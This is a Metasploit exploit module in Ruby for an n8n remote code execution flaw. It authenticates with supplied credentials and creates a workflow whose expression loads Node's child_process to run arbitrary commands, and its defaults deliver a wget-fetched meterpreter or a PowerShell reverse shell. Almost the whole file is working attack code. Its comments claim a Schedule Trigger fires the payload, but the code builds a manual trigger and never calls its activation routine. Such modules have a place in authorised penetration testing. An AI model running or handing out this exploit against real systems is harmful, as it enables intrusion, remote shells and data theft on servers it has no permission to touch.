##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'n8n Workflow Expression Remote Code Execution',
        'Description' => %q{
          This module exploits a critical remote code execution vulnerability (CVE-2025-68613)
          in the n8n workflow automation platform. The vulnerability exists in the workflow
          expression evaluation system where user-supplied expressions enclosed in {{ }}
          are evaluated in an execution context that is not sufficiently isolated from the
          underlying Node.js runtime.

          An authenticated attacker can create a workflow containing malicious expressions
          that access the Node.js process object via this.process.mainModule.require (or via
          the constructor) to load child_process and execute arbitrary system commands.
          This module uses a Schedule Trigger node to automatically fire and evaluate the
          malicious payload. This requires valid credentials to create workflows.

          Successful exploitation may lead to full compromise of the n8n instance,
          including unauthorized access to sensitive data, modification of workflows,
          and execution of system-level operations.

          Affected versions: >= 0.211.0 and < 1.120.4, < 1.121.1, < 1.122.0
        },
        'Author' => [
          'Lukas Johannes MÃ¶ller'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-68613'],
          ['URL', 'https://github.com/n8n-io/n8n/security/advisories'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-68613']
        ],
        'Platform' => ['unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp',
                'FETCH_COMMAND' => 'wget'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ]
        ],
        'Payload' => {
          'BadChars' => %(')
        },
        'Privileged' => false,
        'DisclosureDate' => '2025-06-10',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 5678,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to n8n', '/']),
        OptString.new('USERNAME', [true, 'n8n username or email for authentication']),
        OptString.new('PASSWORD', [true, 'n8n password for authentication'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'rest', 'settings')
    )

    return CheckCode::Unknown('Could not connect to n8n') unless res

    version = nil

    if res.code == 200
      json = res.get_json_document
      version = json['versionCli'] if json.is_a?(Hash)
    end

    if version.nil?
      send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'healthz')
      )
    end

    return CheckCode::Detected('n8n detected but could not determine version') if version.nil?

    print_status("Detected n8n version: #{version}")

    begin
      ver = Rex::Version.new(version)
    rescue ArgumentError
      return CheckCode::Detected("n8n detected, version parsing failed: #{version}")
    end

    # Vulnerable versions: >= 0.211.0 and < 1.120.4 or < 1.121.1 or < 1.122.0
    if ver >= Rex::Version.new('0.211.0')
      if ver < Rex::Version.new('1.120.4')
        return CheckCode::Appears("Version #{version} is vulnerable (< 1.120.4)")
      elsif ver >= Rex::Version.new('1.121.0') && ver < Rex::Version.new('1.121.1')
        return CheckCode::Appears("Version #{version} is vulnerable (1.121.0)")
      elsif ver >= Rex::Version.new('1.122.0')
        return CheckCode::Safe("Version #{version} is not vulnerable")
      end
    end

    CheckCode::Safe("Version #{version} is not vulnerable")
  end

  def authenticate
    print_status('Attempting to authenticate...')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        'emailOrLdapLoginId' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )

    if res&.code == 200
      json = res.get_json_document
      if json.is_a?(Hash) && json['data']
        print_good('Successfully authenticated')
        return true
      end
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        'email' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )

    if res&.code == 200
      json = res.get_json_document
      if json.is_a?(Hash) && (json['data'] || json['success'])
        print_good('Successfully authenticated')
        return true
      end
    end

    fail_with(Failure::NoAccess, 'Authentication failed')
  end

  def create_malicious_workflow(cmd)
    expression_payload = %<{{ (function(){ return this.process.mainModule.require('child_process').execSync('#{cmd}').toString() })() }}>

    @workflow_name = "workflow_#{Rex::Text.rand_text_alphanumeric(8)}"

    workflow_data = {
      'name' => @workflow_name,
      'active' => false,
      'settings' => {
        'saveDataErrorExecution' => 'all',
        'saveDataSuccessExecution' => 'all',
        'saveManualExecutions' => true,
        'executionOrder' => 'v1'
      },
      'nodes' => [
        {
          parameters: {},
          type: 'n8n-nodes-base.manualTrigger',
          typeVersion: 1,
          position: [
            0,
            0
          ],
          'id' => Rex::Text.rand_text_alphanumeric(36),
          name: "When clicking 'Execute workflow'"
        },
        {
          parameters: {
            assignments: {
              assignments: [
                {
                  'id' => Rex::Text.rand_text_alphanumeric(36),
                  name: 'test',
                  value: "=#{expression_payload}",
                  type: 'string'
                }
              ]
            },
            options: {}
          },
          type: 'n8n-nodes-base.set',
          typeVersion: 3.4,
          position: [
            208,
            0
          ],
          'id' => Rex::Text.rand_text_alphanumeric(36),
          name: 'Edit Fields'
        },
      ],
      'connections' => {
        "When clicking 'Execute workflow'" => {
          'main' => [
            [
              {
                'node' => 'Edit Fields',
                'type' => 'main',
                'index' => 0
              }
            ]
          ]
        }
      }
    }

    print_status('Creating malicious workflow...')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => workflow_data.to_json
    )

    unless res&.code == 200 || res&.code == 201
      fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}")
    end

    json = res.get_json_document

    workflow_id = json.dig('data', 'id') || json['id']
    nodes = json.dig('data', 'nodes')
    version_id = json.dig('data', 'versionId')
    id = json.dig('data', 'id')

    unless workflow_id
      fail_with(Failure::UnexpectedReply, 'Failed to get workflow ID from response')
    end

    activation_data = {
      'workflowData' => {
        'name' => @workflow_name,
        'nodes' => nodes,
        'pinData' => {},
        'connections' => {
          "When clicking 'Execute workflow'" => {
            'main' => [
              [
                {
                  'node' => 'Edit Fields',
                  'type' => 'main',
                  'index' => 0
                }
              ]
            ]
          }
        },
        'active' => false,
        'settings' => {
          'saveDataErrorExecution' => 'all',
          'saveDataSuccessExecution' => 'all',
          'saveManualExecutions' => true,
          'executionOrder' => 'v1'
        },
        'tags' => [],
        'versionId' => version_id,
        'meta' => 'null',
        'id' => id
      },
      'startNodes' => [],
      'destinationNode' => 'Edit Fields'
    }

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s, 'run'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => activation_data.to_json
    )

    print_good("Created workflow with ID: #{workflow_id}")
    @workflow_id = workflow_id
    workflow_id
  end

  def execute_workflow(workflow_id)
    print_status("Activating workflow #{workflow_id} to trigger scheduled execution...")

    res = send_request_cgi(
      'method' => 'PATCH',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => { 'active' => true }.to_json
    )

    if res&.code == 200
      print_good('Workflow activated - payload will execute via Schedule Trigger')
      print_status('Waiting for scheduled execution (3-5 seconds)...')
      Rex.sleep(5)
    else
      print_error("Failed to activate workflow: #{res&.code}")
    end
  end

  def delete_workflow(workflow_id)
    print_status("Cleaning up workflow #{workflow_id}...")

    send_request_cgi(
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', workflow_id.to_s),
      'keep_cookies' => true
    )
  end

  def exploit
    authenticate

    create_malicious_workflow(payload.encoded)
  end

  def cleanup
    super
    return unless @workflow_id

    begin
      send_request_cgi(
        'method' => 'PATCH',
        'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s),
        'ctype' => 'application/json',
        'keep_cookies' => true,
        'data' => { 'active' => false }.to_json
      )

      delete_workflow(@workflow_id)
      print_good('Workflow cleaned up successfully')
    rescue StandardError => e
      print_warning("Failed to clean up workflow: #{e.message}")
    end

    @workflow_id = nil
  end
end
